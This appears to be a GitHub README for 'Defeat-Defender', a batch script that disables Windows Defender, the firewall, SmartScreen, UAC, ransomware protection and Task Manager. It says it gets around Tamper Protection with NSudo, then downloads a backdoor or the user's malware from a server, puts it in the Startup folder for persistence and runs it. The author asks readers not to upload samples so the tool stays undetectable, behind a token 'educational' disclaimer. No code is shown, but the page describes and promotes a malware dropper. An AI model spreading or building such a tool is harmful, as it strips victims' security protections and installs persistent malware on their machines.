<p align="center">
    Defeat-Defender-1.2
</p>

---
* **If you like the tool and for my personal motivation so as to develop other tools please  leave a +1 star** 
https://github.com/swagkarna/Defeat-Defender-V1.2
### Powerfull Batch File To Disable Windows Defender,Firewall,Smartscreen And Execute the payload
### Usage :
* Run `run.bat` and enter the direct link of your malware 
* Run the script "Defeat-Defender.bat" . It will ask for Admin Permission.If permission Granted The script will work Silently and dismantle all protection...
---
## After it got admin permission it will disable defender 
 -  PUAProtection 
 -  Automatic Sample Submission
 -  Windows FireWall
 -  Windows Smart Screen(Permanently)
 -  Disable Quickscan
 -  Add exe file  to exclusions in defender settings
 -  Disable Defender Notification (Added Recently)
 -  Disable UAC(Reboot Required)
 -  Disable Ransomware Protection
 -  Disable TaskManager
 -  Disable registry etc..
---

##  *Proof-Of-Concept*

https://user-images.githubusercontent.com/46685308/120778529-0bb82e80-c544-11eb-9a54-d7f5d30fddd0.mp4

 :pray: Please Dont upload sample anywhere...Its been fifth time i am again making this script fud 
 
---


## Bypasssing Windows-Defender Techniques :


Recently Windows Introduced new Feature called "Tamper Protection".Which Prevents the disable of real-time protection and modifying defender registry keys using powershell or cmd...If you need to disable real-time protection you need to do manually....But We will disable Real Time Protection using NSudo without trigerring Windows Defender

---
## Running Defeat-Defender Script
<p align="left">
   <img src="https://raw.githubusercontent.com/swagkarna/Defeat-Defender/main/Screenshot%20(53).png" width=750px height=500px>
   </p>
   
Tested on **Windows 11 Pro**

---

## After Reboot
<p align="left">
   <img src="https://raw.githubusercontent.com/swagkarna/Defeat-Defender/main/Screenshot%20(111).png" width=750px height=500px>
   <img src="https://raw.githubusercontent.com/swagkarna/Defeat-Defender/main/Screenshot%20(112).png" width=750px height=500px>
 </p>
 
---

 ## Warning 
  This Script will completely Disable `Windefend` Services . And also it is very difficult to revert the changes..Think twice before you run the script
    
---
## Behind The Scenes :

 When Batch file is executed it ask for admin permissions.After getting admin privileage it starts to disable windows defender real time protectin , firewall , smartscreen and starts  downloading our backdoor from server and it will placed in startup folder.The backdoor will be executed after it has downloaded from server..And will be started whenever system starts..
 
 
---
## Check out this article :
 https://secnhack.in/create-fud-fully-undetectable-payload-for-windows-10/
 
---

# Note :
### If you want to enable Defender Smart Screen.Use Smart Screen.bat file..
---
# Discalimer :
### Use this only for educational Purpose...Love you Guys Bye.....

---

## Contact :
<a href=mailto:swagkarna@gmail.com><img src="https://img.shields.io/badge/Gmail-swagkarna-green?style=for-the-badge" /></a>
<a href=https://twitter.com/swagkarna><img src="https://img.shields.io/badge/Twitter-@swagkarna-blue?style=for-the-badge" /></a>

---
<p align="center">  
<img src="https://raw.githubusercontent.com/swagkarna/Defeat-Defender/main/42796435.png" width="150px" height="150px"></img>
</p>
<h2 align="center">Inspired From <a href="https://www.youtube.com/channel/UCYS9sTrPpcIVDxz2yVPbuLw">TechChip</a></h2>

---

### Special thanks to  <a href="https://www.linkedin.com/posts/jeffrey-d-howard-6b578225_defeat-defender-powerful-batch-script-to-activity-6792216498413944832-mWEa">Jeffrey-d-howard</a>(Senior Vulnerability Management Lead) For Posting Defeat-Defender on his linked page

---
### ❤️Supporters❤️
[![Stargazers repo roster for @swagkarna/Defeat-Defender-V1.2.0](https://reporoster.com/stars/swagkarna/Defeat-Defender-V1.2)](https://github.com/swagkarna/Defeat-Defender/stargazers)

[![Forkers repo roster for @swagkarna/Defeat-Defender-V1.2.0](https://reporoster.com/forks/swagkarna/Defeat-Defender-V1.2)](https://github.com/swagkarna/Defeat-Defender/network/members)

---

